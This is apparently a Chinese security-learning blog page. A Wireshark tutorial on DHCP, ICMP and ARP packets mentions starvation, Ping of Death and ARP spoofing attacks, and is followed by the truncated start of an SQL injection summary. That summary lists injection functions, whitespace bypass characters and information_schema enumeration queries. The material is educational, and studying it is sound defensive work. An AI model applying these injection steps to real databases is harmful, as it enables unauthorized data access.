<p>​       DHCP的前身是BOOTP协议（Bootstrap Protocol）,BOOTP被创建出来为连接到网络中的设备自动分配地址，后来被DHCP取代了，DHCP比BOOTP更加复杂，功能更强大。后面可以看到，在用Wireshark过滤显示DHCP包，需要输入过滤条件BOOTP，而不是DHCP,但或许是因为我使用的Wireshark版本是比较旧的1.12.9,没有在新版本中尝试过，也许可以输入DHCP让其只显示DHCP包。</p>
<p><strong>2.工作原理</strong></p>
<p><img src="/2021/04/15/2021-04-15/1.png" alt="img"></p>
<p>DHCP的实现分为4步： </p>
<p>第一步：Client端在局域网内发起一个DHCP　Discover包，目的是想发现能够给它提供IP的DHCP Server。 </p>
<p>第二步：可用的DHCP Server接收到Discover包之后，通过发送DHCP Offer包给予Client端应答，意在告诉Client端它可以提供IP地址。 </p>
<p>第三步：Client端接收到Offer包之后，发送DHCP Request包请求分配IP。 </p>
<p>第四步：DHCP Server发送ACK数据包，确认信息。</p>
<p><strong>二、利用Wireshark抓取DHCP包</strong></p>
<p><strong>1.分析</strong></p>
<p>要想抓取到DHCP包，先要保证有可用的DHCP服务器，然后将主机IP地址获取方式设置为自动获取。如果主机在抓包之前已经联网，需要先断开主机的网络连接，然后再连接网络。</p>
<p>cmd中可以使用ipconfig /?查看各参数的含义： </p>
<p><img src="/2021/04/15/2021-04-15/9.png" alt="img"></p>
<p><strong>(1)ipconfig /release</strong> </p>
<p>断开当前的网络连接，主机IP变为0.0.0.0，主机与网络断开，不能访问网络。 </p>
<p><img src="/2021/04/15/2021-04-15/2.png" alt="img"></p>
<p><strong>(2)ipconfig /renew</strong> </p>
<p>更新适配器信息，请求连接网络，这条命令结束之后，主机会获得一个可用的IP，再次接入网络。</p>
<p><strong>2.开始抓包</strong></p>
<p>实验环境：Win10专业版,Wireshark3.2.7，有线连接 </p>
<p>DHCP服务器IPv4地址：10.170.72.254</p>
<p>本机被分配IP：10.170.56.55</p>
<p><strong>(1)在Wireshark中点击start开始抓包，在过滤栏输入bootp，使其只显示DHCP数据包。</strong> </p>
<p><strong>(2)在cmd中输入ipconfig  /release 断开网络连接。</strong></p>
<p><img src="/2021/04/15/2021-04-15/3.jpg" alt="img"></p>
<p>可以看到此时所有的网卡都已经断开。以太网处于断开状态。 由于开了虚拟机的原因，Wireshark中截获到一个DHCP Release数据包。</p>
<p><strong>(3)在cmd中输入ipconfig /renew 请求网络连接。</strong></p>
<p>此时，可以看到在Wireshark中新增了4个DHCP数据包： </p>
<p><img src="/2021/04/15/2021-04-15/10.jpg" alt="img"></p>
<p>数据包1：DHCP Discover </p>
<p>数据包2：DHCP Offer </p>
<p>数据包3：DHCP Request </p>
<p>数据包4：DHCP ACK</p>
<p>注：当直接手动连接wifi时，直接发起request包(另一台pc)</p>
<p><img src="/2021/04/15/2021-04-15/4.png" alt="img"></p>
<p>等待这条命令执行完毕之后，在cmd中可以看到主机被分配了IP，主机成功连入网络中。</p>
<p><img src="/2021/04/15/2021-04-15/5.jpg" alt="img"></p>
<p><strong>(4)为了后续分析使用，我们再执行一次ipconfig /renew：</strong> </p>
<p>可以看到Wireshark中新增了3个数据包：DHCP ACK；DHCP Request;DHCP ACk。如果再次使用ipconfig /renew,<strong>每执行一次会新增2个数据包：DHCP Request;DHCP ACK</strong>。</p>
<p><strong>三、DHCP包分析</strong></p>
<p>下面着重来分析当执行，ipconfig /renew这条命令产生的4个DHCP数据包，这4个数据包代表了客户机和DHCP服务器的交互过程，也是IP动态分配的过程。 </p>
<p><strong>1.DHCP Discover数据包</strong> </p>
<p>(1)Client端使用IP地址0.0.0.0发送了一个广播包，可以看到此时的目的IP为255.255.255.255。Client想通过这个数据包发现可以给它提供服务的DHCP服务器。</p>
<p>(2)从下图可以看出，DHCP属于应用层协议，它在传输层使用UDP协议，目的端口是67。</p>
<p><img src="/2021/04/15/2021-04-15/11.png" alt="img"></p>
<p><strong>2.DHCP Offer包</strong> </p>
<p>当DHCP服务器收到一条DHCP Discover数据包时，用一个DHCP Offer包给予客户端响应。 </p>
<p><img src="/2021/04/15/2021-04-15/6.png" alt="img"></p>
<p> (1)DHCP服务器使用广播地址作为目的地址，因为此时请求分配IP的Client并没有自己ip,而可能有多个Client在使用0.0.0.0这个IP作为源IP向DHCP服务器发出IP分配请求，DHCP也不能使用0.0.0.0这个IP作为目的IP地址，于是依然采用广播的方式，告诉正在请求的Client们，这是一台可以使用的DHCP服务器。</p>
<p>(2)DHCP服务器<strong>提供了一个可用的IP</strong>,在数据包的Your (client) IP Address字段可以看到DHCP服务器提供的可用IP。</p>
<p>(3)除此之外，如图中红色矩形框的内容所示，服务器还发送了子网掩码，路由器，DNS，域名，IP地址租用期等信息。</p>
<p><strong>3.DHCP Request包</strong> </p>
<p>当Client收到了DHCP Offer包以后（如果有多个可用的DHCP服务器，那么可能会收到多个DHCP Offer包），确认有可以和它交互的DHCP服务器存在，于是Client发送Request数据包，请求分配IP。 </p>
<p><img src="/2021/04/15/2021-04-15/7.png" alt="img"></p>
<p>此时的源IP和目的IP依然是0.0.0.0和255.255.255.255。</p>
<p><strong>4.DHCP ACK包</strong> </p>
<p>服务器用DHCP ACK包对DHCP请求进行响应。 </p>
<p><img src="/2021/04/15/2021-04-15/8.png" alt="img"></p>
<p>在数据包中包含以下信息，表示将这些资源信息分配给Client. </p>
<p><strong>Your(client) IP address:分配给Client的可用IP</strong></p>
<p>后面有许多项option信息，前两项是DHCP服务器发送的消息类型（ACK）和服务器的身份标识，后面几项是： </p>
<p>Subnet Mask:Client端分配到的IP的子网掩码； </p>
<p>Router:路由器 </p>
<p>Domain Name Server:DNS,域名服务器 </p>
<p>Domain Name:域名 </p>
<p>IP Address Lease Time:IP租用期。</p>
<p><strong>四、DHCP starvation attack</strong></p>
<p><strong>1.DHCP starvation attack，DHCP饥饿攻击</strong> </p>
<p>有许多中攻击DHCP的技术，这里介绍其中一种，有点类似于SYN 洪范攻击。 </p>
<p><strong>DHCP starvation attack</strong>，中文即DHCP饥饿攻击，就是大量地进食，把可以吃的食物全部吃完，然后让其他人没得吃，最后给其他人提供一些毒药，把人家毒死。</p>
<p>下面来说这种攻击是如何实现的。一些不法分子，伪造合法的MAC地址，不断地向DHCP服务器发出DHCP Request包，最后<strong>耗尽服务器的可用IP</strong>,于是原有的这台DHCP服务器便不能够给客户端分配IP了，此时不法分子再伪造一台DHCP服务器，给客户端分配IP,将客户端的默认网关和DNS都设置成自己的机器，于是便可以对客户端进行<strong>中间人攻击</strong>。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zqixiao_09/article/details/77131239">https://blog.csdn.net/zqixiao_09/article/details/77131239</a></p>
<h1 id="0x02-ICMP协议"><a href="#0x02-ICMP协议" class="headerlink" title="0x02　ICMP协议"></a>0x02　ICMP协议</h1><p><strong>一、动态主机配置协议ICMP  不可靠</strong></p>
<p><strong>1.ICMP简介</strong></p>
<p>​        网络控制消息协议（Internet Control Message Protocol，ICMP）是网路协议族的核心协议之一。它用于TCP/IP网络中发送控制消息，提供可能发生在通信环境中的各种问题反馈，令管理者可以对所发生的问题作出诊断并采取适当的措施。</p>
<p>​       ICMP 依靠IP来完成它的任务，它是IP的主要部分。它与传输协议，如TCP和UDP显著不同：它一般不用于在两点间传输数据。仅ping和traceroute会用到。 IPv4中的ICMP被称作ICMPv4，IPv6中的ICMP则被称作ICMPv6。</p>
<p>​        ICMP是在RFC 792中定义的互联网协议族之一。通常用于返回的错误信息或是分析路由。ICMP错误消息总是包括了源数据并返回给发送者。 ICMP错误消息的例子之一是TTL值过期。每个路由器在转发数据报的时候都会把IP包头中的TTL值减一。如果TTL值为0，“TTL在传输中过期”的消息将会回报给源地址。 每个ICMP消息都是直接封装在一个IP数据包中的，因此，和UDP一样，ICMP是不可靠的。</p>
<p>​        虽然ICMP是包含在IP数据包中的，但是对ICMP消息通常会特殊处理，会和一般IP数据包的处理不同，而不是作为IP的一个子协议来处理。在很多时候，需要去查看ICMP消息的内容，然后发送适当的错误消息到那个原来产生IP数据包的程序，即那个导致ICMP讯息被传送的IP数据包。</p>
<p>​        很多常用的工具是基于ICMP消息的。</p>
<ul>
<li><strong>traceroute是通过发送包含有特殊的TTL的包，然后接收ICMP超时消息和目标不可达消息来实现的。</strong></li>
<li><strong>ping则是用ICMP的”Echo request”（类别代码：8）和”Echo reply”（类别代码：0）消息来实现的。</strong>ping是一款用于检测一个设备可连接性的工具，用于发送ICMP echo请求数据包。</li>
</ul>
<p><strong>二、利用Wireshark抓取DHCP包</strong></p>
<p><strong>1.ping分析</strong></p>
<p>ping自己服务器</p>
<p><img src="/2021/04/15/2021-04-15/21.png" alt="img"></p>
<p><strong>(1)echo ping请求包request</strong></p>
<p><img src="/2021/04/15/2021-04-15/22.png" alt="img"></p>
<p> ICMP头部的Type以及Code的内容:</p>
<ol>
<li>Type表示ICMP消息基于RFC规范的类型或分类。</li>
<li>Code表示ICMP消息基于RFC规范的子类型。</li>
<li>ICMP头部中的Type的值是8，Code值是0，说明是一个echo请求数据包，所包含的数据很少。除了指定的类型、代码以及校验和，这里还有序列号用于匹配请求和响应，并且在可变域中包含有一串随机字符串。</li>
</ol>
<p><strong>(2)echo ping reply响应包</strong></p>
<p><img src="/2021/04/15/2021-04-15/23.png" alt="img"></p>
<ol>
<li>ICMP头部中，类型和代码的值都是0，表示这是一个echo响应。</li>
<li>第二个数据包的序列号和第一个数据包匹配，确定对应关系</li>
<li>Data的部分，这个数据包和第一个数据包字符相同。说明数据包被成功接收，ping成功。</li>
</ol>
<p><strong>2.安全问题</strong></p>
<p>​        ICMP协议本身的特点就决定了它易于攻击网络上的路由器和主机。</p>
<ol>
<li>DDoS：用户可以利用操作系统规定的ICMP数据包的最大尺寸不超过64K这个规定，向网络上的主机发起Ping of Death攻击。因为当ICMP数据包的大小超过64K的时候，目标主机就有可能出现内存分配的错误的情况，导致TCP/IP堆栈崩溃，使得主机死机。</li>
<li>ICMP风暴：向目标主机长时间、连续、大量地发送ICMP数据包，也会最终使系统瘫痪。大量的ICMP数据包会形成“ICMP风暴”，耗费目标主机大量的CPU资源。</li>
<li>ICMP的echo请求使用的字符串可被利用，攻击者可使用这段内容来推测设备所使用的操作系统。或放置一些数据位用作反向连接。</li>
</ol>
<p><strong>2.路由跟踪</strong></p>
<p><img src="/2021/04/15/2021-04-15/24.png" alt="img"></p>
<p>​       路由跟踪识别一个设备到另一个设备的路径。对于溯源来说，确定数据包从一个地方到另一个地方所走的路径是异常重要的。</p>
<p>​       tracert：利用了ICMP协议，通过其跟踪结果，我们就可以画出数据包所走的路径。总共经过9个跃点到达目标IP </p>
<p>(1)第一个数据包：192.168.137.44 –&gt; 192.168.137.1</p>
<p><img src="/2021/04/15/2021-04-15/25.png" alt="img"></p>
<p>​        类比于此前分析的echo请求。这个数据包是从IP地址为192.168.137.44到47.95.28.98的简单的echo的请求，并且ICMP数据包头部的每一部分都与echo请求数据包相同。数据包的<strong>IP头中的TTL的值为1：****这个数据包会在它所遇到的第一个路由器的地方被丢弃</strong>。由于目标地址47.95.28.98是外网地址，肯定至少存在一个路由器，因此这个数据包不会到达目的地。</p>
<p>(2)第二个数据包： 192.168.137.1 –&gt;192.168.137.44</p>
<p><img src="/2021/04/15/2021-04-15/26.png" alt="img"></p>
<p>​       此数据包是在前往目的地的路径上，第一个路由器发回的reply响应。由于第一个数据包到达192.168.137.1后，TTL的值变成了0，因此就不能够继续传输，此时路由器就回复了一个ICMP响应。这个数据包的类型是11，代码是0，告诉我们这个数据包的TTL在传输中超时，所以目标地址不可达。</p>
<p>​    <strong>ICMP双头包：</strong>在ICMP的结尾部分包含了原echo请求的IP头和ICMP数据的拷贝。因此这个数据包也被叫做ICMP双头包，表示包含有两个ICMP的包头信息。双包头信息在网络故障检修的时候会非常有用。</p>
<p>(3)第三个数据包：找192.168.137.44</p>
<p><img src="/2021/04/15/2021-04-15/27.png" alt="img"></p>
<p>​        TTL为2，保证此数据包到达第二跳的路由。但是即便TTL的值变成了2，从下面的数据包来看，它也是无法到达目的地，直至TTL的值增长到9，这个数据包才到达了目的地。</p>
<p>(4)响应： 192.168.137.1 –&gt;10.170.72.254</p>
<p><img src="/2021/04/15/2021-04-15/28.png" alt="img"></p>
<p>为何在此之前由两个数据包TTL为3呢？说明第二跳已经找到，开始物色第三跳，只不过回应时间稍长而已。</p>
<p>(5)找第三跳</p>
<p>(6)第三跳响应：172.16.255.242–&gt;192.168.137.44</p>
<p><img src="/2021/04/15/2021-04-15/29.png" alt="img"></p>
<p>(6)第四跳响应：113.140.11.97–&gt;192.168.137.44</p>
<p>之后如上</p>
<h1 id="0x03-地址解析协议ARP"><a href="#0x03-地址解析协议ARP" class="headerlink" title="0x03　地址解析协议ARP**"></a>0x03　地址解析协议ARP**</h1><p><strong>1.ARP简介</strong></p>
<p>​          ARP：<strong>IP地址解析为物理地址</strong>（MAC地址）。这里之所以需要使用MAC地址，是因为网络中用于连接各个设备的交换机使用了内容可寻址存储器（CAM，Coment Addressable Memory）。该存储器维护的ARP表列出了它在每一个端口的所有连接设备的MAC地址。</p>
<p>​         当<strong>交换机</strong>收到了一个指向特定MAC地址的网络流量，它就会使用这个表，来确定应该使用哪一个端口发送流量。如果目标MAC地址是未知的，那么这个传输设备会首先在它的缓存中查找这个地址，如果没有找到，那么这个地址就需要通过在网络上额外的通信中解析了。或者我们可以结合下图来说明这个问题：</p>
<p><img src="/2021/04/15/2021-04-15/31.png" alt="img"></p>
<p>​             OSI模型将网络分为了七层，而IP地址位于第三层，也就是网络层，MAC地址位于数据链路层，也就是第二层。那么在通过以太网发送IP数据包的时候，需要首先封装第三层和第二层的报头。但由于发送数据包时只知道目标IP地址，不知道其MAC地址，而又不能直接跨越第二、三层，所以需要地址解析协议。而在使用了ARP协议后，计算机可以按照网络层IP数据包的头部信息，将硬件地址信息（MAC地址）对应起来，以保证通信的顺利进行。ARP协议的基本功能就是将一个已知的IP地址解析成MAC地址，以便主机之间可以正常地通信。</p>
<p>​            ARP协议是在RFC826中定义的。<strong>RFC（Request for Comments）是定义各种协议实现标准的官方文档</strong>。可在RFC Editor的首页搜索RFC文档。</p>
<p><strong>2.工作原理</strong></p>
<p>通过查看RFC826可以知道，其实ARP协议的解析过程只使用了两种数据包：一个ARP请求和一个ARP响应，如下图所示：</p>
<p><img src="/2021/04/15/2021-04-15/32.png" alt="img"></p>
<p>其详细工作原理为：</p>
<p>（1）当主机A想要给主机B发送数据时，主机A会首先在自己的<strong>本地ARP缓存表</strong>中检查与主机B相匹配的MAC地址。</p>
<p>（2）如果主机A在自己的缓存表中没找到主机B的相关条目，那么它就要想办法获取主机B的MAC地址。这就需要将<strong>ARP的请求帧广播</strong>到本地网络上的所有主机中。这个请求<strong>帧包含有主机A的IP地址和MAC地址，以及主机B的IP地址</strong>。网络中凡是收到请求帧的主机都会检查自己的IP地址是否与请求地址一致，如果不一致，则会丢弃该请求帧。对于上图来说，主机C和主机D会丢弃主机A发出的请求帧。</p>
<p>（3）主机B确定ARP请求中的IP地址和自己的IP地址一致，那么就会<strong>将主机A的IP地址和MAC地址添加到本地的缓存列表中</strong>。</p>
<p>（4）主机B将包含有自己<strong>MAC地址的ARP响应消息直接回复给主机A（单播）</strong>。</p>
<p>（5）主机A收到从主机B发来的ARP响应消息后，会<strong>将主机B的IP地址和MAC地址添加到自己的ARP缓存表中</strong>。接下来，主机A就可以向主机B发送消息了。</p>
<p><strong>二、利用Wireshark抓取ARP包</strong></p>
<p>查找局域网内IP：for /L %i IN (1,1,254) DO ping -w 2 -n 1 192.168.9.%i</p>
<p>​                                 arp -a</p>
<p><strong>1.ARP分析</strong></p>
<p>ARP缓存表如下：</p>
<p>本机所在局域网的ARP缓存表为192.168.9.20,每行表示一个ARP条目。缓存表有效期为１２０秒</p>
<p><strong>主机启动时会主动发送ARP应答 刷新邻居的ARP缓存</strong></p>
<p><img src="/2021/04/15/2021-04-15/33.png" alt="img"></p>
<p><strong>(1)ARP请求包request</strong></p>
<p><img src="/2021/04/15/2021-04-15/34.png" alt="img"></p>
<p>１.Ethernet：数据包目的地址是ff:ff:ff:ff:ff:ff，广播地址，说明当前数据包会被广播到当前网段中的所有设备上。</p>
<p>２.ARP请求的头部信息：硬件类型、协议类型、硬件地址长度、协议长度、</p>
<p>３.操作码（该值为1，表示这是一个ARP请求包）、发送方的MAC和IP地址，以及接收方的IP地址。</p>
<p>４.目标MAC地址还是未知的，因此就以全0的形式显示。</p>
<p><strong>(2)ARP reply响应包</strong></p>
<p><img src="/2021/04/15/2021-04-15/35.png" alt="img"></p>
<p>１.目标MAC地址已更新</p>
<p>２.操作码（Opcode）现在是2，表明这是一个用于响应的数据</p>
<p><strong>（３）免费的ARP</strong></p>
<p><img src="/2021/04/15/2021-04-15/36.png" alt="img"></p>
<ol>
<li>以广播的形式发出，网络上的所有主机都能收到它。</li>
<li>发送方的IP地址和接收方的IP地址是一致的。网络中的其它主机收到这个数据包之后，它会让这些主机使用新的IP和MAC地址映射关系来更新它们的ARP表。</li>
<li>由于这个ARP数据包是源主机未经请求主动发出的，并导致了目标主机更新了ARP缓存，所以称之为免费的ARP。</li>
</ol>
<p><strong>2.安全问题</strong></p>
<p>​       ARP协议本身广播不验证的特点就决定了它易于攻击</p>
<ol>
<li>DDoS：用户可以利用操作系统规定的ICMP数据包的最大尺寸不超过64K这个规定，向网络上的主机发起Ping of Death攻击。因为当ICMP数据包的大小超过64K的时候，目标主机就有可能出现内存分配的错误的情况，导致TCP/IP堆栈崩溃，使得主机死机。</li>
<li>ARP欺骗：向目标主机连续、大量地发送假的ARP数据包。</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/13/2021-04-13/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/13/2021-04-13/" class="post-title-link" itemprop="url">sql注入总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-13 20:00:01" itemprop="dateCreated datePublished" datetime="2021-04-13T20:00:01+08:00">2021-04-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-20 20:51:01" itemprop="dateModified" datetime="2021-04-20T20:51:01+08:00">2021-04-20</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>在本篇随笔当中将会介绍什么是SQL注入，如何查找和利用SQL注入及如何防止SQL注入</p>
<p><img src="/2021/04/13/2021-04-13/1.jpg"></p>
<h1 id="0x02-SQL注入"><a href="#0x02-SQL注入" class="headerlink" title="0x02 SQL注入"></a>0x02 SQL注入</h1><h2 id="1-原理："><a href="#1-原理：" class="headerlink" title="1. 原理："></a>1. 原理：</h2><p>客户端提交的表单数据被拼接到数据库的查询语句当中,被当作SQL语句的一部分执行。</p>
<p>SQL injection is a web security vulnerability that allows an attacker to  interfere with queries that an application  makes to its databases.It generally allows an attacker to view  data that not normally able to retrive.</p>
<h2 id="2-危害："><a href="#2-危害：" class="headerlink" title="2. 危害："></a>2. 危害：</h2><p>数据库信息泄漏、网页篡改、服务器被远程控制，被安装后门、网站被挂马，传播恶意软件(修改数据库一些字段的值，嵌入网马链接，进行挂马攻击)、数据库被恶意操作(数据库服务器被攻击，数据库的系统管理员帐户被窜改)、破坏硬盘数据，瘫痪全系统。</p>
<h2 id="3-相关-可跳过"><a href="#3-相关-可跳过" class="headerlink" title="3.相关(可跳过)"></a>3.相关(可跳过)</h2><h3 id="a-数据库分类及判断："><a href="#a-数据库分类及判断：" class="headerlink" title="a.数据库分类及判断："></a>a.数据库分类及判断：</h3><p>数据库分关系型数据库和非关系型数据库。</p>
<p><strong>关系型数据库</strong>：主要代表：Mysql、SQL Server、Oracle、PostgreSQL。关系型数据库是指采用了二维表格模型这种关系模型来组织数据的数据库。支持联表查询、使用正则表达式查询、嵌套查询，还可写独立的SQL脚本</p>
<p><strong>非关系型数据库</strong>：主要代表MongoDB，Redis、CouchDB。NoSQL非关系型数据库，主要指那些非关系型的、分布式的，且一般不保证ACID的数据存储系统。NoSQL以键值来存储，且结构不稳定，每个元组字段不同，不局限于固定结构，可以减少时间和空间开销。获取用户的不同信息时，仅需要根据key来取出对应的value值即可。</p>
<p>其中，判断后台数据库类型</p>
<h4 id="1-根据web语言判断："><a href="#1-根据web语言判断：" class="headerlink" title="1.根据web语言判断："></a>1.根据web语言判断：</h4><table>
<thead>
<tr>
<th>数据库类型</th>
<th>语言</th>
</tr>
</thead>
<tbody><tr>
<td>Mysql、PostgreSQL</td>
<td>PHP</td>
</tr>
<tr>
<td>Oracle、Mysql</td>
<td>Java</td>
</tr>
<tr>
<td>Oracle</td>
<td>JSP</td>
</tr>
<tr>
<td>MSSQL(Microsoft SQL Server)</td>
<td>ASP和.NET</td>
</tr>
</tbody></table>
<h4 id="2-根据操作系统："><a href="#2-根据操作系统：" class="headerlink" title="2.根据操作系统："></a>2.根据操作系统：</h4><p>Mysql：Apache</p>
<p>SQL server：windows(IIS)</p>
<h4 id="3-根据数据库报错判断："><a href="#3-根据数据库报错判断：" class="headerlink" title="3.根据数据库报错判断："></a>3.根据数据库报错判断：</h4><p>ａ．MYSQL数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>有mysql关键字，为MYSQL数据库。</p>
<p>ｂ．MSSQL数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft OLE DB Provider for ODBC Drivers 错误 &#39;80040e14&#39;  [Microsoft][ODBC SQL Server Driver][SQL Server]Line 1:</span><br></pre></td></tr></table></figure>

<p>mssql是微软的，由Microsoft和ODBC，为MSSQL数据库</p>
<p>ｃ．access数据库</p>
<p>Microsoft JET Database Engine错误’80040e14’错误的话，则是access数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line">详见：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;e308d96e2ecd</span><br></pre></td></tr></table></figure>

<p>ｄ．ORACLE数据库</p>
<p>ORA是ORACLE</p>
<p>以下都以Mysql为例</p>
<h3 id="b-常见函数："><a href="#b-常见函数：" class="headerlink" title="b.  常见函数："></a>b.  常见函数：</h3><ol>
<li><p>```</p>
<ol>
<li><p>version() MySQL 版本 select version()</p>
</li>
<li><p>user() 数据库用户名</p>
</li>
<li><p>database() 数据库名 select databases;</p>
</li>
<li><p>@@datadir 返回数据库的存储目录 select @@datadir;</p>
</li>
<li><p>@@version_compile_os 操作系统版本 select @@version_compile_os;</p>
</li>
<li><p>SQL 注释语句 (“–”与”/<em>…</em>/“)</p>
<p>(1)#<br>(2)–       表示单行注释<br>(3) /<em>comment</em>/    用于多行(块)注释<br>(4)/*! MYSQL Special SQL */</p>
</li>
<li><p>concat(str1,str2,…) 没有分隔符地连接字符串，如有任何一个参数为NULL ，则返回值为 NULL</p>
</li>
<li><p>concat_ws(separator,str1,str2,…) 含有分隔符地连接字符串</p>
</li>
<li><p>group_concat(str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每条数据</p>
</li>
<li><p>mid(str, pos, len);<br>substr();<br>substring()-从一个字符串中截取指定数量的字符</p>
</li>
<li><p>limit()  从某个值开始，取出之后的N条数据的语法 (返回结果中的前几条数据或者中间的数据)<br>select * from 表名 limit M,N;m是:指从m位开始(第一位为0)         n是:指取n条</p>
</li>
<li><p>order by 默认按照升序对记录进行排序， ORDER BY Company (DESC)</p>
</li>
<li><p>group by 结合合计函数，根据一个或多个列对结果集进行分组</p>
</li>
<li><p>sleep()<br>select sleep(N)可以让此语句运行N秒钟</p>
</li>
<li><p>if() 语法：<br>IF(expr1,expr2,expr3) 其中，expr1是判断条件，expr2和expr3是符合expr1的自定义的返回结果。</p>
</li>
<li><p>left() LEFT(str,len) 返回最左边的n个字符的字符串str，或NULL如果任何参数是NULL</p>
</li>
<li><p>count() COUNT(column_name) 语法 COUNT(column_name) 函数返回指定列的值的数目(NULL 不计入)</p>
</li>
<li><p>round()  四舍五入一个正数或者负数，结果为一定长度的值</p>
</li>
<li><p>hex() 16进制编码 select hex(‘dvwa’)  //编码         select unhex(‘64767761’)  //解码         </p>
<p>select 0x64767761  //16进制解码</p>
</li>
<li><p>ascii(arg) ：返回目标字符对应的ASCII码。   ord（arg）将字符转为ASCII     </p>
</li>
<li><p>char(arg)：返回ASCII码只对应的字符     语句：select char（97）</p>
</li>
<li><p>hex()：将目标字符串装换成16进制格式的数据     语句： select hex(“dvwa”)</p>
</li>
<li><p>unhex()：将16进制格式的数据装换成原字符串</p>
<pre><code>语句：unhex(64767761) 
</code></pre>
</li>
<li><p>load_file()读取文件</p>
</li>
<li><p>floor()返回小于等于X的最大整数</p>
</li>
<li><p>strcmp() 比较两个字符串ascii值的大小（大小写不敏感）</p>
</li>
<li><p>exp()返回e的X次方</p>
</li>
<li><p>Mysql可以使用的空白字符：<br>%09<br>%0a<br>%0b<br>%0c<br>%0d<br>%20<br>%a0<br>/**/</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### c. 常用语句：</span><br><span class="line"></span><br><span class="line">- 查库</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;sql</span><br><span class="line">select schema_name from imformation_schema.schemata;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>查表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_table <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> schema_name<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>查字段</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> colunm_name <span class="keyword">from</span> information_schema.colunms <span class="keyword">where</span> table_name<span class="operator">=</span>users <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>查数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> security.users;</span><br></pre></td></tr></table></figure>

<h3 id="d-常用名词："><a href="#d-常用名词：" class="headerlink" title="d. 常用名词："></a>d. 常用名词：</h3><p><strong>information_schema</strong></p>
<p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p>
<p><strong>SCHEMATA</strong></p>
<p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</p>
<p><strong>TABLES</strong></p>
<p>储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p>
<p><strong>COLUMNS</strong></p>
<p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p>
</li>
</ol>
<h2 id="4-基本流程："><a href="#4-基本流程：" class="headerlink" title="4. 基本流程："></a>4. 基本流程：</h2><ol>
<li><p>判断是否有注入点</p>
</li>
<li><p>获取数据库基本信息</p>
<p>字段数：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n </span><br></pre></td></tr></table></figure></li>
<li><p>获取数据库库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--获取系统数据库名</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,schema_name <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="comment">--获取当前数据库名</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,database()</span><br></pre></td></tr></table></figure></li>
<li><p>获取数据库表名</p>
